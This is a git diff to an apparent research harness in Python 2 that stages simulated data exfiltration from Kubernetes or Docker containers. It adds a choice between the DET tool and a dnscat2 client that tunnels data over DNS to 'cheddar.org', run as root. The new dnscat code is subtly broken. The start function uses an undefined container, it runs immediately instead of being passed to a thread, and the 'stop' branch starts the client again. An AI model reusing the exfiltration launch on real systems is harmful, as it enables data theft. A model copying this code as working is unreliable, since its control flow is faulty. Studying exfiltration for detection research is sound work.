@@ -19,6 +19,7 @@ import random
 import re
 import pexpect
 
+
 #Locust contemporary client count.  Calculated from the function f(x) = 1/25*(-1/2*sin(pi*x/12) + 1.1), 
 #   where x goes from 0 to 23 and x represents the hour of the day
 CLIENT_RATIO_NORMAL = [0.0440, 0.0388, 0.0340, 0.0299, 0.0267, 0.0247, 0.0240, 0.0247, 0.0267, 0.0299, 0.0340,
@@ -45,6 +46,17 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
         experiment_name = config_params["experiment_name"]
     orchestrator = config_params["orchestrator"]
     class_to_installer = config_params["exfiltration_info"]["exfiltration_path_class_which_installer"]
+    network_plugin = 'none'
+    try:
+        network_plugin = config_params["network_plugin"]
+    except:
+        pass
+
+    exfil_method = 'DET'
+    try:
+        exfil_method = config_params["exfil_method"]
+    except:
+        pass
 
     min_exfil_bytes_in_packet = int(config_params["exfiltration_info"]["min_exfil_data_per_packet_bytes"])
     max_exfil_bytes_in_packet = int(config_params["exfiltration_info"]["max_exfil_data_per_packet_bytes"])
@@ -115,8 +127,8 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
     # map all of the names of the proxy container instances to their corresponding IP's
     # a dict of dicts (instance -> networks -> ip)
     print "about to map the proxy instances to their networks to their IPs..."
-    proxy_instance_to_networks_to_ip = map_container_instances_to_ips(orchestrator, possible_proxies, class_to_networks)
-    proxy_instance_to_networks_to_ip.update( map_container_instances_to_ips(orchestrator, possible_originators, class_to_networks) )
+    proxy_instance_to_networks_to_ip = map_container_instances_to_ips(orchestrator, possible_proxies, class_to_networks, network_plugin)
+    proxy_instance_to_networks_to_ip.update( map_container_instances_to_ips(orchestrator, possible_originators, class_to_networks, network_plugin) )
     print "proxy_instance_to_networks_to_ip", proxy_instance_to_networks_to_ip
     for container, network_to_ip in proxy_instance_to_networks_to_ip.iteritems():
         print container.name, [i.name for i in network_to_ip.keys()]
@@ -152,7 +164,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
         # look backward to find src class, then index into selected_proxies, and then index into
         # instances_to_network_to_ips (will need to match up networks)
 
-        # todo: explicit_target from the config file (exp_six)... if it has corresponding src and dst values
+        # explicit_target from the config file (exp_six)... if it has corresponding src and dst values
         # then use those, if one or more values is missing, use the values from below instead
         try:
             explicit_dsts,explicit_srcs = config_params["exfiltration_info"]["explicit_target_src"][class_name]
@@ -206,7 +218,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                            min_exfil_bytes_in_packet, experiment_name)
     #'''
     # now setup the originator (i.e. the client that originates the exfiltrated data)
-    # todo: explicit_target from the config file (exp_six)... if it has corresponding src and dst values
+    # explicit_target from the config file (exp_six)... if it has corresponding src and dst values
 
     next_instance_ips, _ = find_dst_and_srcs_ips_for_det(exfil_path, originator_class,
                                                                          selected_containers, localhostip,
@@ -214,11 +226,11 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                                                                          class_to_networks)
 
     try:
-	    explicit_dsts,explicit_srcs = config_params["exfiltration_info"]["explicit_target_src"][originator_class]
+        explicit_dsts,explicit_srcs = config_params["exfiltration_info"]["explicit_target_src"][originator_class]
     except:
-	    explicit_dsts,explicit_srcs = 'None','None'
+        explicit_dsts,explicit_srcs = 'None','None'
     if explicit_dsts != 'None': 
-	    next_instance_ips = explicit_dsts
+        next_instance_ips = explicit_dsts
 
     print "next ip(s) for the originator to send to", next_instance_ips
     directory_to_exfil = config_params["exfiltration_info"]["folder_to_exfil"]
@@ -233,6 +245,9 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                 else:
                     file_to_exfil = ''
                 files_to_exfil.append(file_to_exfil)
+
+    # todo: will want to enable of using cilium (b/c will need to deactive policies before this)
+    #a = raw_input("please enable cilium policies and then press any key to continue")
 
     print "files_to_exfil", files_to_exfil
     experiment_length = config_params["experiment"]["experiment_length_sec"]
@@ -327,14 +342,25 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
             file_to_exfil = files_to_exfil[0]
             for class_name, container_instances in selected_originators.iteritems():
                 for container in container_instances:
-                    thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocol, container))
+                    if exfil_method == 'DET':
+                        thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocol, container))
+                    elif exfil_method == 'dnscat':
+                        thread.start_new_thread(start_dnscat_client(), (container))
+                    else:
+                        print "that exfiltration method was not recognized!"
+
 
         print "need to wait this long before stopping the det client...", start_time + exfil_end_time - time.time()
         time.sleep(start_time + exfil_end_time - time.time())
         if exfil_p:
             for class_name, container_instances in selected_originators.iteritems():
                 for container in container_instances:
-                    stop_det_client(container)
+                    if exfil_method == 'DET':
+                        stop_det_client(container)
+                    elif exfil_method == 'dnscat':
+                        start_dnscat_client()
+                    else:
+                        print "that exfiltration method was not recognized!"
 
         # step (7) wait, all the tasks are being taken care of elsewhere
         time_left_in_experiment = start_time + int(experiment_length) + 7 - time.time()
@@ -364,14 +390,14 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                              '_det_server_local_output_' + str(i) + '.txt'])
             subprocess.call(['truncate', '-s', '0' ,'./' + experiment_name + '_det_server_local_output.txt'])
 
-        ''' # enable if you are using cilium as the network plugin
-        cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-pf6mk", "--", "cilium", "endpoint", "list",
+        #''' # enable if you are using cilium as the network plugin
+        cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
                                 "-o", "json"]
         out = subprocess.check_output(cilium_endpoint_args)
         container_config_file = experiment_name + '_' + str(i) + '_cilium_network_configs.txt'
         with open(container_config_file, 'w') as f:
             f.write(out)
-        '''
+        #'''
 
     # stopping the proxies can be done the same way (useful if e.g., switching
     # protocols between experiments, etc.)
@@ -525,7 +551,7 @@ def get_IP(orchestrator):
     return "-1"
 
 
-# note this may need to be implemented as a seperate thread
+# note this may need to be impflemented as a seperate thread
 # in which case it'll also need experimental time + will not need
 # to reset the bash situation
 def start_tcpdump(interface, network_namespace, tcpdump_time, filename):
@@ -621,7 +647,8 @@ def get_class_instances(orchestrator, class_name, class_to_net):
         container_instances = []
         for container in client.containers.list():
             #print "container", container, container.name
-            if class_name in container.name:
+            # note: lots of containers have a logging container as a sidecar... wanna make sure we don't use that one
+            if class_name in container.name and 'log' not in container.name and 'POD' not in container.name:
                 print class_name, container.name
                 container_instances.append(container)
 
@@ -680,37 +707,48 @@ def get_network_ids(orchestrator, list_of_network_names):
         pass
 
 
-def map_container_instances_to_ips(orchestrator, class_to_instances, class_to_networks):
+def map_container_instances_to_ips(orchestrator, class_to_instances, class_to_networks, network_plugin):
     #if orchestrator == "docker_swarm":
     # i think this can work for both orchestrators
     instance_to_networks_to_ip = {}
     print "class_to_instance_names", class_to_instances.keys()
     print class_to_instances
     ice = 0
+    pod_to_ip = get_cilium_mapping()
+    print "pod to ip", pod_to_ip
     for class_name, containers in class_to_instances.iteritems():
         print 'class_to_networks[class_name]', class_to_networks[class_name], class_name,  class_to_networks
         for container in containers:
-
-            instance_to_networks_to_ip[ container ] = {}
-
-            # TODO: for k8s, cannot actually use the coantiner_attribs for the container.
-            # need to use the attribs of the corresponding pod
-
-            if orchestrator =='kubernetes':
-                container_atrribs = find_corresponding_pod_attribs(container.name) ### TODO ####
+            # use if cilium
+            if network_plugin == 'cilium':
+                print "theoretically connected networks", class_to_networks[class_name]
+                if 'POD' not in container.name:
+                    for ip, pod_net in pod_to_ip.iteritems():
+                        if container.name.split('_')[2] in pod_net[0] and ":" not in ip: # don't want ipv6
+                            instance_to_networks_to_ip[ container ] = {}
+                            print 'pos match', ip, pod_net, container.name.split('_')[2]
+                            instance_to_networks_to_ip[container][class_to_networks[class_name][0]] = ip
+                            print "current instance_to_networks_to_ip", instance_to_networks_to_ip
             else:
-                container_atrribs =  container.attrs
+                # if not cilium
+                instance_to_networks_to_ip[ container ] = {}
+                if orchestrator =='kubernetes':
+                    # for k8s, cannot actually use the coantiner_attribs for the container.
+                    # need to use the attribs of the corresponding pod
+                    container_atrribs = find_corresponding_pod_attribs(container.name) ### TODO ####
+                else:
+                    container_atrribs =  container.attrs
 
-            for connected_network in class_to_networks[class_name]:
-                ice += 1
-                instance_to_networks_to_ip[container][connected_network] = []
-                try:
-                    print "container_attribs", container_atrribs["NetworkSettings"]["Networks"]
-                    print "connected_network.name", connected_network, 'end connected network name'
-                    ip_on_this_network = container_atrribs["NetworkSettings"]["Networks"][connected_network.name]["IPAddress"]
-                    instance_to_networks_to_ip[container][connected_network] = ip_on_this_network
-                except:
-                    pass
+                for connected_network in class_to_networks[class_name]:
+                    ice += 1
+                    instance_to_networks_to_ip[container][connected_network] = []
+                    try:
+                        print "container_attribs", container_atrribs["NetworkSettings"]["Networks"]
+                        print "connected_network.name", connected_network, 'end connected network name'
+                        ip_on_this_network = container_atrribs["NetworkSettings"]["Networks"][connected_network.name]["IPAddress"]
+                        instance_to_networks_to_ip[container][connected_network] = ip_on_this_network
+                    except:
+                        pass
     print "ice", ice
     print "instance_to_networks_to_ip", instance_to_networks_to_ip
     return instance_to_networks_to_ip
@@ -723,6 +761,15 @@ def map_container_instances_to_ips(orchestrator, class_to_instances, class_to_ne
         #pass
     #else:
     #pass # maybe want to return an error?
+
+def get_cilium_mapping():
+    cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
+                          "-o", "json"]
+    out = subprocess.check_output(cilium_endpoint_args)
+    #container_config_file = experiment_name + '_' + str(i) + '_cilium_network_configs.txt'
+    container_config = json.loads(out)
+    ip_to_pod = parse_cilium(container_config)
+    return ip_to_pod
 
 def find_corresponding_pod_attribs(cur_container_name):
     client = docker.from_env()
@@ -737,6 +784,16 @@ def find_corresponding_pod_attribs(cur_container_name):
             print "found container", container.name
             return container.attrs
 
+def parse_cilium(config):
+    mapping = {}
+    for pod_config in config:
+        pod_name = pod_config['status']['external-identifiers']['pod-name']
+        ipv4_addr = pod_config['status']['networking']['addressing'][0]['ipv4']
+        ipv6_addr = pod_config['status']['networking']['addressing'][0]['ipv6']
+        mapping[ipv4_addr] = (pod_name, 'cilium')
+        mapping[ipv6_addr] = (pod_name, 'cilium')
+    return mapping
+    
 def install_det_dependencies(orchestrator, container, installer):
     #if orchestrator == 'kubernetes':
     #    ## todo
@@ -745,14 +802,14 @@ def install_det_dependencies(orchestrator, container, installer):
         # okay, so want to read in the relevant bash script
         # make a list of lists, where each list is a line
         # and then send each to the container
-        ''' # Note: this is only needed for Atsea Shop
+        #''' # Note: this is only needed for Atsea Shop
         upload_config_command = ["docker", "cp", "./src/modify_resolve_conf.sh", container.id+ ":/modify_resolv.sh"]
         out = subprocess.check_output(upload_config_command)
         print "upload_config_command", upload_config_command, out
 
         out = container.exec_run(['sh', '//modify_resolv.sh'], stream=True, user="root")
         print out
-        '''
+        #'''
 
         if installer == 'apk':
             filename = './install_scripts/apk_det_dependencies.sh'
@@ -1017,6 +1074,20 @@ def setup_config_file_det_client(dst, container, directory_to_exfil, regex_to_ex
     print "start file to exfil", file_to_exfil, "end file to exfil"
     #print next( file_to_exfil.output )
     return file_to_exfil
+
+def start_dnscat_client():
+    cmds = ['/dnscat2/client/dnscat', 'cheddar.org']
+    print "start dns exfil commands", str(cmds)
+    out = container.exec_run(cmds, user="root", workdir='/dnscat2/client/', stdout=True)
+    print "dnscat client output output"
+
+def stop_dnscat_client(container):
+    cmds = ["pkill", "dnscat"]
+    out = container.exec_run(cmds, user="root", stream=True)
+    print "stop dnscat client output: "#, out
+    #print "response from command string:"
+    for output in out.output:
+        print output
 
 def start_det_client(file, protocol, container):
     cmds = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-f", file]
